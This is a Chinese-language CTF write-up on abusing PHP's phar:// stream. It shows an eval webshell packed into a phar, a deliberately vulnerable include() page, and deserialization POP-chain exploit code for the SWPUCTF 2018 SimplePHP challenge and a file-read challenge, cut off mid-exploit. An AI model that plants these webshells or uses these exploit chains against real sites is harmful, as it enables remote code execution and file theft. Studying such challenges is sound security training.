<p>在PHP的官网手册当中，该流用于解压phar文件，我们允许利用该流直接读取被压缩的phar文件，但是我们实战中却发现，该流允许我们读取任意一个文件，只要他们是经过压缩的文件，PHP会自动的解压文件，并且读取里面的PHP。</p>
<p>phar的参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701</span><br></pre></td></tr></table></figure>

<p>（感觉PHP有点垃圾..使用Phar文件，但是却完全没有任何的过滤，他将识别任何模块的后缀，直接将其解压，之后读取其中的PHP文件</p>
<p>例如我们构造一个test.php，我们将其压缩成test.zip，之后修改zip后缀为jpg，他还是会能够识别，并且读取其中的文件</p>
<h3 id="1-1-1-phar写🐎文件包含"><a href="#1-1-1-phar写🐎文件包含" class="headerlink" title="1.1.1 phar写🐎文件包含"></a>1.1.1 phar写🐎文件包含</h3><p>测试的代码如下：</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//phar://./test.jpg/test.php</span></span><br><span class="line"><span class="keyword">include</span>($_POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以利用如下代码生成一个phar文件，并且生成🐎</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[123]); ?&gt;&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用如下：</p>
<p><img src="image-20201029135915083.png" alt="image-20201029135915083"></p>
<h3 id="1-1-2-phar反序列化"><a href="#1-1-2-phar反序列化" class="headerlink" title="1.1.2 phar反序列化"></a>1.1.2 phar反序列化</h3><p>在以前的大部分事件，我们都是利用反序列化的函数，但是人们现在安全意识越来越高之后，这种利用方式越来越难。</p>
<p>但是Phar://读取文件phar的时候，会反序列化meta-data储存的信息</p>
<p>Phar文件的一个标准特征如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;</span></span><br><span class="line"><span class="comment"> O:10:&quot;TestObject&quot;:0:&#123;&#125;   test.tx   GBMB</span></span><br></pre></td></tr></table></figure>

<p>我们可以发现Meta-data的内容就是以反序列化的形式储存的，利用Phar协议解析的时候都会反序列化，同时文件操作函数一般都能用伪协议流，所以Phar://的供给面还是相当广的。</p>
<p>所以满足如下条件的时候该类型序列化可以使用：</p>
<ul>
<li>可以上传Phar文件(或者文件自己使用Phar读取)</li>
<li>具有可利用的魔术方法</li>
<li>文件操作函数的参数可用</li>
</ul>
<p>例题：[SWPUCTF 2018]SimplePHP</p>
<p>首先就尝试读取一波文件file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>Class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>同时还拥有一个f1ag.php</p>
<p>直接访问的话会不允许，在show类当中放出了提示，pahr://phar.jpg</p>
<p> 查找POP链的过程是这样的：</p>
<p>Test的$text = base64_encode(file_get_contents($value));作为我们的终极目标</p>
<p>我们查看$value是从哪里传来的，发现一行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = <span class="keyword">$this</span>-&gt;params[$key];</span><br></pre></td></tr></table></figure>

<p>之后查看，发现$key通过__get进行传导</p>
<p>于是构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>回到上面看，因为之前有echo，通过echo查找tostring</p>
<p>于是对source进行控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br></pre></td></tr></table></figure>

<p>对A进行反序列化即可。</p>
<h2 id="1-2-open-basedir"><a href="#1-2-open-basedir" class="headerlink" title="1.2 open_basedir"></a>1.2 open_basedir</h2><p>该函数是php用于基于x目录允许，利用该函数，PHP可以限制用户的读取文件范围，这也就很好的解释了为什么我们只能读取到../../index.php的内容，而无法读取到根目录下flag.txt的文件了</p>
<h1 id="2-做题思路"><a href="#2-做题思路" class="headerlink" title="2.做题思路"></a>2.做题思路</h1><h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>这道题允许下载文件，上传文件和删除文件，我们下载文件的时候可以任意修改文件名（但是由于open_basedir的限制，我们没法办法读取到flag</p>
<p>故利用如下方式能够找到class.php,index.php,download.php,delete.php的内容</p>
<p><img src="image-20201029140816514.png" alt="image-20201029140816514"></p>
<h2 id="2-构造phar反序列化"><a href="#2-构造phar反序列化" class="headerlink" title="2.构造phar反序列化"></a>2.构造phar反序列化</h2><p>根据前面的知识，我们知道我们可以利用phar生成文件，构造pop链读取文件，问题就在于如何构造pop了，我们在这道题很明显要找到的函数就是file_get_contents，能找到File类下的close()类会使用，于是查找全文当中，看看有没有魔术方法能够使用到close类：</p>
<p>最终在User类中查找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 中间略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>于是第一次我尝试如此构造文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果在本地fuzz的时候就发现这样子就压根没回显啊。后来才知道必须输出一下才能看见内容。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是就卡住了，上下再审计代码，找一个echo函数，发现恰好就在FileList当中。。：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $table = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($func) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        $table .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;  <span class="comment">//这句是全局的核心</span></span><br><span class="line">            $table .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities($value) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities($filename) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            $table .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br></pre></td></tr></table></figure>

<p>想办法，能够控制result，发现题目也正好给出了call这个魔术方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>自己看了一些，这个其实就是一个手写的回调函数嘛。</p>
<p>于是尝试思考，我们可以通过FileList出发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">        $files = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>($files);</span><br><span class="line">        $filenames =<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先new一个User类出来，并将db指向FileList，之后类会被销毁，将会调用FileList当中的call方法，call方法需要我们指定参数名和filename，所以在__construct中进行修改,最终调试得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line"><span class="comment">//        $this-&gt;results = array();</span></span><br><span class="line">        $file-&gt;filename = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        var_dump($file);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line"><span class="comment">//            var_dump( $file-&gt;$func());</span></span><br><span class="line">            <span class="comment">//将result设置成test.txt当中的内容</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//销毁的时候就会被输出了！</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table = <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .=  htmlentities($value);</span><br><span class="line">            &#125;</span><br><span class="line">            $table .=   htmlentities($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调试成功之后构造exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line"><span class="comment">//        $this-&gt;results = array();</span></span><br><span class="line">        $file-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span 